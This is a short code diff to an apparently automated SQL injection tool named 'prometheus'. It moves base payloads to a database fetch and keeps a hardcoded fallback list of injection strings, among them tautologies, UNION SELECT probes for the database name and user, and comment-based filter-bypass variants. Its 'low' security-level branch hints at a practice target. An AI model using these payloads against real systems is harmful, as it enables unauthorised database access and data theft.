@@ -53,13 +53,18 @@ def run_prometheus():
     # Targets Persistence
     exp_manager.save_target_profile(client.base_url, db_type=db_type)
     
-    # Load payloads
-    base_payloads = [
-      "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
-      "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
-      "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
-      "1/*!50000UNION*//*!50000SELECT*/1,2"
-    ]
+    # Load payloads from database API
+    print("[*] Loading base payloads from Database...", flush=True)
+    base_payloads = client.fetch_base_payloads()
+    
+    # Fallback/Default payloads if DB is empty or inaccessible
+    if not base_payloads:
+        base_payloads = [
+          "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
+          "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
+          "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
+          "1/*!50000UNION*//*!50000SELECT*/1,2"
+        ]
 
     # Add quote-based seeds if level is low
     if target_security == "low":
